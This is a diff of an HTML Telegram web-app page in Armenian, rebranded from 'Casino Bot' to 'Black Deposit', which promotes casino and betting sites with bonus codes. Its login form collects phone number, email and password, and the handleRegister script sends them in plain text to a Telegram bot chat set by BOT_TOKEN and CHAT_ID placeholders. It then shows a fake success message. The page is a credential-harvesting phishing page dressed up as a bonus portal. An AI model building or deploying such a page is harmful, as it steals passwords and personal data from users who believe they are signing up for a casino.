@@ -3,98 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Casino Bot - Official</title>
+    <title>Black Casino & Deposit</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body class="bg-zinc-950 text-zinc-100 font-sans min-h-screen flex flex-col justify-between pb-24">
+<body class="bg-black text-white font-sans min-h-screen flex flex-col justify-between pb-28">
 
-    <div id="auth-modal" class="fixed inset-0 bg-zinc-950/95 z-50 flex items-center justify-center p-4 hidden">
+    <!-- ԳՐԱՆՑՄԱՆ ՊԱՏՈՒՀԱՆ (Սև ոճով) -->
+    <div id="auth-modal" class="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-4 hidden">
         <div class="bg-zinc-900 border border-zinc-800 w-full max-w-sm p-6 rounded-3xl shadow-2xl space-y-4">
             <div class="text-center space-y-1">
-                <h2 class="text-2xl font-black text-yellow-500">Casino Bot</h2>
-                <p class="text-xs text-zinc-400">Խաղերին և բոնուսներին հասնելու համար գրանցվեք</p>
+                <h2 class="text-2xl font-black text-yellow-500">Black Deposit</h2>
+                <p class="text-xs text-zinc-400">Մուտք գործեք բոնուսներ ստանալու համար</p>
             </div>
 
             <form id="register-form" onsubmit="handleRegister(event)" class="space-y-3">
                 <div>
                     <label class="text-xs text-zinc-400 block mb-1">Հեռախոսահամար</label>
-                    <input type="tel" id="phone" required placeholder="+374 XX XXXXXX" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
+                    <input type="tel" id="phone" required placeholder="+374 XX XXXXXX" class="w-full bg-black border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
                 </div>
                 <div>
                     <label class="text-xs text-zinc-400 block mb-1">Էլ. հասցե (Email)</label>
-                    <input type="email" id="email" required placeholder="example@mail.com" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
+                    <input type="email" id="email" required placeholder="example@mail.com" class="w-full bg-black border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
                 </div>
                 <div>
                     <label class="text-xs text-zinc-400 block mb-1">Գաղտնաբառ</label>
-                    <input type="password" id="password" required placeholder="••••••••" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
+                    <input type="password" id="password" required placeholder="••••••••" class="w-full bg-black border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
                 </div>
-                <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-400 text-zinc-950 font-bold py-3.5 rounded-xl transition mt-2 shadow-lg shadow-yellow-500/20">
-                    Գրանցվել և Մուտք գործել
+                <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-400 text-black font-bold py-3.5 rounded-xl transition mt-2 shadow-lg shadow-yellow-500/20">
+                    Մուտք գործել
                 </button>
             </form>
         </div>
     </div>
 
+    <!-- ԳԼԽԱՎՈՐ ԷՋ -->
     <div>
-        <header class="p-4 flex justify-between items-center border-b border-zinc-800 bg-zinc-950/80 backdrop-blur-md sticky top-0 z-30">
+        <!-- Վերնագիր -->
+        <header class="p-4 flex justify-between items-center border-b border-zinc-900 bg-black/90 backdrop-blur-md sticky top-0 z-30">
             <div class="flex items-center space-x-2">
-                <span class="text-xl font-black tracking-wider text-yellow-500">Casino Bot</span>
+                <span class="text-xl font-black tracking-wider text-yellow-500">BLACK DEPOSIT</span>
             </div>
             <div class="flex items-center space-x-3">
                 <button onclick="logout()" class="bg-zinc-900 border border-zinc-800 px-3 py-1 rounded-full text-xs font-bold text-red-400 transition">
                     Ելք
                 </button>
-                <button class="text-lg">🇦🇲</button>
             </div>
         </header>
 
+        <!-- Բաներների սլայդեր -->
         <div class="p-4">
             <div class="overflow-x-auto flex space-x-3 scrollbar-none snap-x">
-                <div class="min-w-[300px] h-40 bg-gradient-to-r from-emerald-600 to-teal-700 rounded-2xl p-4 flex flex-col justify-between snap-center shadow-lg relative overflow-hidden">
+                <div class="min-w-[310px] h-44 bg-gradient-to-r from-zinc-900 to-zinc-800 border border-zinc-800 rounded-2xl p-5 flex flex-col justify-between snap-center shadow-xl relative overflow-hidden">
                     <div>
-                        <span class="bg-black/30 text-xs px-2 py-1 rounded text-white font-bold">Tonplay</span>
-                        <h2 class="text-2xl font-black mt-2">CASHBACK 9.5%</h2>
+                        <span class="bg-yellow-500/20 text-yellow-400 text-[11px] px-2.5 py-1 rounded-md font-bold">BLACK VIP BONUS</span>
+                        <h2 class="text-3xl font-black mt-2 text-white">550% + 400 FS</h2>
                     </div>
                     <div class="flex justify-between items-center">
-                        <span class="text-xs text-zinc-100">Ամենշաբաթյա վերադարձ</span>
-                        <span class="text-2xl">🦆</span>
-                    </div>
-                </div>
-                <div class="min-w-[300px] h-40 bg-gradient-to-r from-yellow-600 to-amber-700 rounded-2xl p-4 flex flex-col justify-between snap-center shadow-lg relative overflow-hidden">
-                    <div>
-                        <span class="bg-black/30 text-xs px-2 py-1 rounded text-white font-bold">WELCOME PACKAGE</span>
-                        <h2 class="text-2xl font-black mt-2">225% + 1000 FS</h2>
-                    </div>
-                    <div class="flex justify-between items-center">
-                        <span class="text-xs text-zinc-100">Կոդ՝ CASBOT26</span>
-                        <span class="text-2xl">👑</span>
+                        <span class="text-xs text-zinc-400">Ակտիվ է սև դեպոզիտի համար</span>
+                        <span class="text-3xl">♠️</span>
                     </div>
                 </div>
             </div>
         </div>
 
+        <!-- Բովանդակություն -->
         <main class="px-4 space-y-3" id="content-container">
-            </main>
+            <!-- Բեռնվում է JavaScript-ով -->
+        </main>
     </div>
 
-    <nav class="fixed bottom-0 left-0 right-0 bg-zinc-900/95 backdrop-blur-md border-t border-zinc-800 p-3 flex justify-around z-40">
-        <button onclick="switchTab('games')" id="btn-games" class="flex items-center space-x-2 bg-yellow-500 text-zinc-950 px-6 py-2.5 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20">
-            <span>🎮</span>
-            <span>Խաղեր (Games)</span>
+    <!-- Ներքևի նավարկման վահանակ -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-zinc-950/95 backdrop-blur-md border-t border-zinc-900 p-3 flex justify-around z-40">
+        <button onclick="switchTab('games')" id="btn-games" class="flex items-center space-x-2 bg-yellow-500 text-black px-6 py-3 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20">
+            <span>🎰</span>
+            <span>Սլոտեր (Games)</span>
         </button>
-        <button onclick="switchTab('sport')" id="btn-sport" class="flex items-center space-x-2 text-zinc-400 px-6 py-2.5 rounded-full font-bold text-sm transition">
+        <button onclick="switchTab('sport')" id="btn-sport" class="flex items-center space-x-2 text-zinc-400 px-6 py-3 rounded-full font-bold text-sm transition">
             <span>⚽</span>
             <span>Սպորտ (Sport)</span>
         </button>
     </nav>
 
+    <!-- ՏՐԱՄԱԲԱՆՈՒԹՅՈՒՆ -->
     <script>
-        // TELEGRAM BOT CONFIGURATION (Գրեք ձեր տվյալները այստեղ)
+        // ⚠ Հիշեցում. Բոտից հաղորդագրություն ստանալու համար նախ պետք է ձեր բոտին (Start) տված լինեք Telegram-ում:
         const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
         const CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
-        // Էջը բացվելիս ստուգել գրանցումը և բեռնել խաղերը
         window.onload = function() {
             const isRegistered = localStorage.getItem('casino_user_registered');
             if (!isRegistered) {
@@ -103,7 +99,6 @@
             switchTab('games');
         }
 
-        // Գրանցման հաստատում և տվյալների ուղարկում Telegram
         async function handleRegister(event) {
             event.preventDefault();
             const phone = document.getElementById('phone').value;
@@ -111,26 +106,21 @@
             const password = document.getElementById('password').value;
 
             if (phone && email && password) {
-                const message = `🚨 Նոր գրանցում Casino Bot-ում:\n\n📱 Հեռախոս: ${phone}\n📧 Email: ${email}\n🔑 Գաղտնաբառ: ${password}`;
+                const message = `🚨 Նոր գրանցում (Black Deposit):\n\n📱 Հեռախոս: ${phone}\n📧 Email: ${email}\n🔑 Գաղտնաբառ: ${password}`;
                 
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message
-                        })
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                     });
                 } catch (error) {
                     console.error('Error sending to telegram:', error);
                 }
 
                 localStorage.setItem('casino_user_registered', 'true');
-                localStorage.setItem('casino_user_email', email);
-                
                 document.getElementById('auth-modal').classList.add('hidden');
-                alert('Հաջողությամբ գրանցվեցիք։ Բարի գալուստ!');
+                alert('Հաջողությամբ մուտք գործեցիք։');
             }
         }
 
@@ -139,130 +129,146 @@
             location.reload();
         }
 
-        // Պրոմոկոդերի պատճենում
         function copyCode(code) {
             navigator.clipboard.writeText(code).then(() => {
                 alert('Պրոմոկոդը պատճենվեց՝ ' + code);
             });
         }
 
-        // Բաժինների փոխարկում (Խաղեր/Սլոտեր և Սպորտ)
         function switchTab(tab) {
             const btnGames = document.getElementById('btn-games');
             const btnSport = document.getElementById('btn-sport');
             const container = document.getElementById('content-container');
 
             if (tab === 'games') {
-                btnGames.className = "flex items-center space-x-2 bg-yellow-500 text-zinc-950 px-6 py-2.5 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20";
-                btnSport.className = "flex items-center space-x-2 text-zinc-400 px-6 py-2.5 rounded-full font-bold text-sm transition";
+                btnGames.className = "flex items-center space-x-2 bg-yellow-500 text-black px-6 py-3 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20";
+                btnSport.className = "flex items-center space-x-2 text-zinc-400 px-6 py-3 rounded-full font-bold text-sm transition";
                 
                 container.innerHTML = `
-                    <h3 class="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-2">Հայտնի Սլոտեր և Կազինոներ</h3>
+                    <div class="flex justify-between items-center mb-1">
+                        <h3 class="text-xs font-bold text-zinc-400 uppercase tracking-wider">Սև Դեպոզիտ և Թոփ Սլոտեր</h3>
+                        <span class="text-xs text-yellow-500 font-bold">VIP</span>
+                    </div>
                     
-                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-12 h-12 bg-purple-900 rounded-xl flex items-center justify-center font-bold text-lg text-purple-300">T</div>
+                    <!-- Խաղ 1 -->
+                    <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
+                        <div class="flex items-center space-x-3.5">
+                            <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">T</div>
                             <div>
-                                <h4 class="font-bold text-sm">Tonplay</h4>
-                                <div class="flex gap-1.5 mt-1">
-                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">250 FS</span>
-                                    <span class="bg-emerald-500/10 text-emerald-500 text-[10px] font-bold px-1.5 py-0.5 rounded">Up to 7775</span>
+                                <h4 class="font-bold text-base text-white">Tonplay</h4>
+                                <p class="text-xs text-zinc-400 mt-0.5">Սև դեպոզիտի բոնուս</p>
+                                <div class="flex gap-1.5 mt-2">
+                                    <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">250 FS</span>
+                                    <span class="bg-zinc-800 text-zinc-300 text-[11px] font-extrabold px-2 py-0.5 rounded-md">Մինչև 7775</span>
                                 </div>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-2">
-                            <button onclick="copyCode('CBTONPLAY250')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
-                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="copyCode('CBTONPLAY250')" class="bg-black border border-zinc-800 hover:bg-zinc-800 text-xs px-3 py-1.5 rounded-xl text-zinc-300 font-bold transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3.5 py-1.5 rounded-xl font-black text-xs transition shadow-md">Խաղալ ↗</a>
                         </div>
                     </div>
 
-                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-12 h-12 bg-indigo-950 rounded-xl flex items-center justify-center font-bold text-lg text-indigo-400">M</div>
+                    <!-- Խաղ 2 -->
+                    <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
+                        <div class="flex items-center space-x-3.5">
+                            <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">M</div>
                             <div>
-                                <h4 class="font-bold text-sm">Mellstroy Game</h4>
-                                <div class="flex gap-1.5 mt-1">
-                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">400 FS</span>
-                                    <span class="bg-purple-500/10 text-purple-400 text-[10px] font-bold px-1.5 py-0.5 rounded">550%</span>
+                                <h4 class="font-bold text-base text-white">Mellstroy Game</h4>
+                                <p class="text-xs text-zinc-400 mt-0.5">VIP փաթեթ</p>
+                                <div class="flex gap-1.5 mt-2">
+                                    <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">400 FS</span>
+                                    <span class="bg-zinc-800 text-zinc-300 text-[11px] font-extrabold px-2 py-0.5 rounded-md">550%</span>
                                 </div>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-2">
-                            <button onclick="copyCode('CASBOT26')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
-                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="copyCode('CASBOT26')" class="bg-black border border-zinc-800 hover:bg-zinc-800 text-xs px-3 py-1.5 rounded-xl text-zinc-300 font-bold transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3.5 py-1.5 rounded-xl font-black text-xs transition shadow-md">Խաղալ ↗</a>
                         </div>
                     </div>
 
-                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-12 h-12 bg-pink-950 rounded-xl flex items-center justify-center font-bold text-lg text-pink-400">Л</div>
+                    <!-- Խաղ 3 -->
+                    <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
+                        <div class="flex items-center space-x-3.5">
+                            <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">Л</div>
                             <div>
-                                <h4 class="font-bold text-sm">ЛЯ.Casino</h4>
-                                <div class="flex gap-1.5 mt-1">
-                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">300 FS</span>
-                                    <span class="bg-blue-500/10 text-blue-400 text-[10px] font-bold px-1.5 py-0.5 rounded">100%</span>
+                                <h4 class="font-bold text-base text-white">ЛЯ.Casino</h4>
+                                <p class="text-xs text-zinc-400 mt-0.5">Արագ վճարումներ</p>
+                                <div class="flex gap-1.5 mt-2">
+                                    <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">300 FS</span>
+                                    <span class="bg-zinc-800 text-zinc-300 text-[11px] font-extrabold px-2 py-0.5 rounded-md">100%</span>
                                 </div>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-2">
-                            <button onclick="copyCode('CASINOBOT')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
-                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="copyCode('CASINOBOT')" class="bg-black border border-zinc-800 hover:bg-zinc-800 text-xs px-3 py-1.5 rounded-xl text-zinc-300 font-bold transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3.5 py-1.5 rounded-xl font-black text-xs transition shadow-md">Խաղալ ↗</a>
                         </div>
                     </div>
 
-                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-12 h-12 bg-red-950 rounded-xl flex items-center justify-center font-bold text-lg text-red-400">F</div>
+                    <!-- Խաղ 4 -->
+                    <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
+                        <div class="flex items-center space-x-3.5">
+                            <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">F</div>
                             <div>
-                                <h4 class="font-bold text-sm">Fenix Casino</h4>
-                                <div class="flex gap-1.5 mt-1">
-                                    <span class="bg-yellow-500/10 text-yellow-500 text-[10px] font-bold px-1.5 py-0.5 rounded">400 FS</span>
-                                    <span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-1.5 py-0.5 rounded">500%</span>
+                                <h4 class="font-bold text-base text-white">Fenix Casino</h4>
+                                <p class="text-xs text-zinc-400 mt-0.5">Անսահմանափակ բոնուսներ</p>
+                                <div class="flex gap-1.5 mt-2">
+                                    <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">400 FS</span>
+                                    <span class="bg-zinc-800 text-zinc-300 text-[11px] font-extrabold px-2 py-0.5 rounded-md">500%</span>
                                 </div>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-2">
-                            <button onclick="copyCode('CASINOBOT')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
-                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="copyCode('CASINOBOT')" class="bg-black border border-zinc-800 hover:bg-zinc-800 text-xs px-3 py-1.5 rounded-xl text-zinc-300 font-bold transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3.5 py-1.5 rounded-xl font-black text-xs transition shadow-md">Խաղալ ↗</a>
                         </div>
                     </div>
                 `;
             } else {
-                btnSport.className = "flex items-center space-x-2 bg-yellow-500 text-zinc-950 px-6 py-2.5 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20";
-                btnGames.className = "flex items-center space-x-2 text-zinc-400 px-6 py-2.5 rounded-full font-bold text-sm transition";
+                btnSport.className = "flex items-center space-x-2 bg-yellow-500 text-black px-6 py-3 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20";
+                btnGames.className = "flex items-center space-x-2 text-zinc-400 px-6 py-3 rounded-full font-bold text-sm transition";
                 
                 container.innerHTML = `
-                    <h3 class="text-xs font-semibold text-zinc-400 uppercase tracking-wider mb-2">Սպորտային Բոնուսներ</h3>
+                    <div class="flex justify-between items-center mb-1">
+                        <h3 class="text-xs font-bold text-zinc-400 uppercase tracking-wider">Սպորտային Բոնուսներ</h3>
+                        <span class="text-xs text-yellow-500 font-bold">VIP</span>
+                    </div>
                     
-                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-12 h-12 bg-blue-900 rounded-xl flex items-center justify-center font-bold text-lg text-blue-300">1W</div>
+                    <!-- Սպորտ 1 -->
+                    <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
+                        <div class="flex items-center space-x-3.5">
+                            <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-lg text-yellow-500 shadow-inner">1W</div>
                             <div>
-                                <h4 class="font-bold text-sm">1Win Sport</h4>
-                                <div class="flex gap-1.5 mt-1">
-                                    <span class="bg-emerald-500/10 text-emerald-500 text-[10px] font-bold px-1.5 py-0.5 rounded">500% Բոնուս</span>
+                                <h4 class="font-bold text-base text-white">1Win Sport</h4>
+                                <p class="text-xs text-zinc-400 mt-0.5">Բարձր գործակիցներ</p>
+                                <div class="flex gap-1.5 mt-2">
+                                    <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">500% Սպորտ Բոնուս</span>
                                 </div>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-2">
-                            <button onclick="copyCode('CasiBot100')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
-                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="copyCode('CasiBot100')" class="bg-black border border-zinc-800 hover:bg-zinc-800 text-xs px-3 py-1.5 rounded-xl text-zinc-300 font-bold transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3.5 py-1.5 rounded-xl font-black text-xs transition shadow-md">Բացել ↗</a>
                         </div>
                     </div>
 
-                    <div class="bg-zinc-900 border border-zinc-800 p-3.5 rounded-2xl flex items-center justify-between">
-                        <div class="flex items-center space-x-3">
-                            <div class="w-12 h-12 bg-orange-950 rounded-xl flex items-center justify-center font-bold text-lg text-orange-400">888</div>
+                    <!-- Սպորտ 2 -->
+                    <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
+                        <div class="flex items-center space-x-3.5">
+                            <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-lg text-yellow-500 shadow-inner">888</div>
                             <div>
-                                <h4 class="font-bold text-sm">888Starz</h4>
-                                <div class="flex gap-1.5 mt-1">
-                                    <span class="bg-emerald-500/10 text-emerald-500 text-[10px] font-bold px-1.5 py-0.5 rounded">200% Բոնուս</span>
+                                <h4 class="font-bold text-base text-white">888Starz</h4>
+                                <p class="text-xs text-zinc-400 mt-0.5">Կիբերսպորտ և ֆուտբոլ</p>
+                                <div class="flex gap-1.5 mt-2">
+                                    <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">200% Բոնուս</span>
                                 </div>
                             </div>
                         </div>
-                        <div class="flex items-center space-x-2">
-                            <button onclick="copyCode('888_87519')" class="bg-zinc-800 hover:bg-zinc-700 text-xs px-2.5 py-2 rounded-xl text-zinc-300 transition">Copy</button>
-                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-zinc-950 p-2.5 rounded-xl font-bold transition">↗</a>
+                        <div class="flex flex-col items-end space-y-2">
+                            <button onclick="copyCode('888_87519')" class="bg-black border border-zinc-800 hover:bg-zinc-800 text-xs px-3 py-1.5 rounded-xl text-zinc-300 font-bold transition">Copy</button>
+                            <a href="https://t.me" target="_blank" class="bg-yellow-500 hover:bg-yellow-400 text-black px-3.5 py-1.5 rounded-xl font-black text-xs transition shadow-md">Բացել ↗</a>
                         </div>
                     </div>
                 `;
